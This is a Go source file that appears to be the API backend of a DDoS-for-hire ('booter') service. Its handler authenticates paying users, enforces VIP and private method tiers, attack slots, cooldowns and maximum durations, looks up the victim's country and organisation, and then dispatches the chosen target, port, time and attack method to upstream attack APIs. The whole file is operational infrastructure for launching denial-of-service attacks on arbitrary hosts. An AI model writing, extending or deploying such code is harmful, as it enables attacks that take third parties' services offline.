package managers

import (
	"encoding/json"
	"fmt"
	"io"
	"log"
	"net/http"
	"strconv"
	"sync"
	"time"
	"visioncnc/database"
	"visioncnc/utils"
)

// Global per-user mutex map to serialize attack processing per user
var userLocks sync.Map

func getUserLock(username string) *sync.Mutex {
	lock, _ := userLocks.LoadOrStore(username, &sync.Mutex{})
	return lock.(*sync.Mutex)
}

func CheckVIPStatus(license, method string, db *database.Database) (bool, error) {
	userInfo := db.GetAccountInfo(license)
	methodConfig, err := utils.GetMethodConfig(method)
	if err != nil || methodConfig == nil {
		return false, nil
	}
	if methodConfig.Permission != nil && utils.HasVipPermission(method) {
		return userInfo.Vip == 1, nil
	}
	return true, nil
}

func CheckPrivateStatus(license, method string, db *database.Database) (bool, error) {
	userInfo := db.GetAccountInfo(license)
	methodConfig, err := utils.GetMethodConfig(method)
	if err != nil || methodConfig == nil {
		return false, nil
	}
	if methodConfig.Permission != nil && utils.HasPrivatePermission(method) {
		return userInfo.Private == 1, nil
	}
	return true, nil
}

func processAttack(username, password, target, port, timeStr, methodName string, db *database.Database, config *utils.Config) (map[string]string, error) {
	user := db.GetAccountInfo(username)

	userLock := getUserLock(username)
	userLock.Lock()
	defer userLock.Unlock()

	if user.ApiAccess != 1 {
		return nil, fmt.Errorf("API access is denied.")
	}
	if db.IsAccountExpired(username) {
		return nil, fmt.Errorf("Account has expired.")
	}
	if !config.Attacks_enabled && user.Admin != 1 {
		return nil, fmt.Errorf("Attacks are disabled.")
	}

	methodConfig, err := utils.GetMethodConfig(methodName)
	if err != nil || methodConfig == nil {
		return nil, fmt.Errorf("Method not found.")
	}
	if !utils.IsValidTarget(target) {
		return nil, fmt.Errorf("Invalid target format.")
	}

	// Global slots
	if db.GetCurrentAttacksLength() > config.Global_slots {
		return nil, fmt.Errorf("global network slots (%d) are currently in use", config.Global_slots)
	}

	// Per-method slots
	if db.GetCurrentAttacksLength2(methodConfig.Method) >= methodConfig.Slots {
		return nil, fmt.Errorf("all slots of method '%s' (%d) are currently in use", methodConfig.Method, methodConfig.Slots)
	}

	// Per-layer slots
	if limit, ok := config.Layer_slots[methodConfig.Group]; ok && limit > 0 {
		if db.GetCurrentAttacksLengthByGroup(methodConfig.Group) >= limit {
			return nil, fmt.Errorf("%s layer slots (%d) are currently in use", methodConfig.Group, limit)
		}
	}

	if cooldown := db.HowLongOnCooldown(username, user.Cooldown); cooldown > 0 {
		return nil, fmt.Errorf("Cooldown active (%d seconds left).", cooldown)
	}
	if user.Admin != 1 && config.Global_cooldown > 0 {
		if globalCooldown := db.HowLongOnGlobalCooldown(config.Global_cooldown); globalCooldown > 0 {
			return nil, fmt.Errorf("Global cooldown active (%d seconds left).", globalCooldown)
		}
	}
	if db.GetUserCurrentAttacksCount(username) >= user.Concurrents {
		return nil, fmt.Errorf("All concurrent attack slots are in use.")
	}
	if user.PowerSaving != 1 && db.IsTargetCurrentlyUnderAttack(target) {
		return nil, fmt.Errorf("Target is already under attack.")
	}
	if user.BypassSpam != 1 && db.IsSpamming(username) {
		return nil, fmt.Errorf("Spam protection active. Please wait.")
	}
	if user.BypassBlacklist != 1 {
		if isFunnelTargetBlocked(target) {
			lm := GetSharedLogManager()
			if lm != nil {
				lm.LogEvent("blacklist_blocked", map[string]string{
					"source":   "API",
					"username": username,
					"target":   target,
					"port":     port,
					"time":     timeStr,
					"method":   methodName,
				})
			}
			return nil, fmt.Errorf("Target is blocked.")
		}
	}

	timeInt, err := strconv.Atoi(timeStr)
	if err != nil {
		return nil, fmt.Errorf("Invalid time format: %s", timeStr)
	}
	if timeInt > user.Maxtime {
		return nil, fmt.Errorf("Your max attack time is %d.", user.Maxtime)
	}

	if valid, _ := CheckVIPStatus(username, methodName, db); !valid {
		return nil, fmt.Errorf("VIP access required for this method.")
	}
	if valid, _ := CheckPrivateStatus(username, methodName, db); !valid {
		return nil, fmt.Errorf("PRIVATE access required for this method.")
	}

	asnInfo := fetchASNInfoFunnel(target, config)

	// Log attack event
	lm := GetSharedLogManager()
	if lm != nil {
		lm.LogEvent("attack_sent", map[string]string{
			"source":   "API",
			"username": username,
			"target":   target,
			"port":     port,
			"time":     timeStr,
			"method":   methodName,
			"layer":    methodConfig.Group,
			"country":  asnInfo.Country,
			"org":      asnInfo.Org,
			"region":   asnInfo.Region,
		})
	}
	db.LogAttack(username, target, port, timeInt, methodName)

	response := map[string]string{
		"error":                "false",
		"message":              "Attack Sent",
		"target":               target,
		"method":               methodName,
		"target_country":       asnInfo.Country,
		"target_region":        asnInfo.Region,
		"target_org":           asnInfo.Org,
		"your_running_attacks": fmt.Sprintf("%d/%d", db.GetUserCurrentAttacksCount(username), user.Concurrents),
	}

	// Dispatch API requests in background
	selected := utils.SelectAPIs(methodName, methodConfig.ApiMode, methodConfig.API)
	timeout := 2 * time.Second
	if methodConfig.ApiTimeout > 0 {
		timeout = time.Duration(methodConfig.ApiTimeout) * time.Second
	}

	go func() {
		client := &http.Client{Timeout: timeout}
		var wg sync.WaitGroup
		for _, entry := range selected {
			fullURL := utils.ReplacePlaceholdersFunnel(entry.URL, username, password, target, port, timeStr, methodName)
			wg.Add(1)
			go func(url, label string) {
				defer wg.Done()
				maxAttempts := 1 + methodConfig.ApiRetry
				for attempt := 0; attempt < maxAttempts; attempt++ {
					res, err := client.Get(url)
					if err != nil {
						utils.RecordAPIError(url, label)
						log.Printf("[ATTACK] Error on %s (attempt %d): %v", label, attempt+1, err)
						continue
					}
					io.Copy(io.Discard, res.Body)
					res.Body.Close()
					utils.RecordAPISuccess(url, label)
					log.Printf("[ATTACK] %s → sent (HTTP %d)", label, res.StatusCode)
					break
				}
			}(fullURL, entry.Label)
		}
		wg.Wait()
	}()

	return response, nil
}

func FunnelCreate(w http.ResponseWriter, r *http.Request, db *database.Database, config *utils.Config) {
	if r.Method != http.MethodGet {
		respondWithJSON(w, true, "Invalid request method.")
		return
	}

	params := r.URL.Query()
	username := params.Get("username")
	password := params.Get("password")
	target := params.Get("target")
	port := params.Get("port")
	timeStr := params.Get("time")
	method := params.Get("method")

	if username == "" || password == "" || target == "" || port == "" || timeStr == "" || method == "" {
		respondWithJSON(w, true, "Missing required parameters.")
		return
	}
	if !db.AuthenticateUser(username, password) {
		respondWithJSON(w, true, "Invalid credentials.")
		return
	}

	response, err := processAttack(username, password, target, port, timeStr, method, db, config)
	if err != nil {
		respondWithJSON(w, true, err.Error())
		return
	}

	respondWithJSON(w, false, response)
}

// fetchASNInfoFunnel retrieves country/org/region for a target IP
func fetchASNInfoFunnel(target string, config *utils.Config) struct{ Country, Org, Region string } {
	var result struct{ Country, Org, Region string }
	apiURL := "https://ipinfo.io/" + target + "/json"
	if config != nil && config.IpinfoToken != "" {
		apiURL += "?token=" + config.IpinfoToken
	}
	client := &http.Client{Timeout: 3 * time.Second}
	resp, err := client.Get(apiURL)
	if err != nil {
		return result
	}
	defer resp.Body.Close()
	json.NewDecoder(resp.Body).Decode(&result)
	return result
}

func respondWithJSON(w http.ResponseWriter, isError bool, message interface{}) {
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"error":   isError,
		"message": message,
	})
}

// isFunnelTargetBlocked checks if a target is in the blacklist (supports CIDR ranges).
func isFunnelTargetBlocked(target string) bool {
	blockedIPs := utils.ReadBlacklistedIPs("assets/blacklists/list.json")
	return utils.IsTargetBlocked(target, blockedIPs)
}
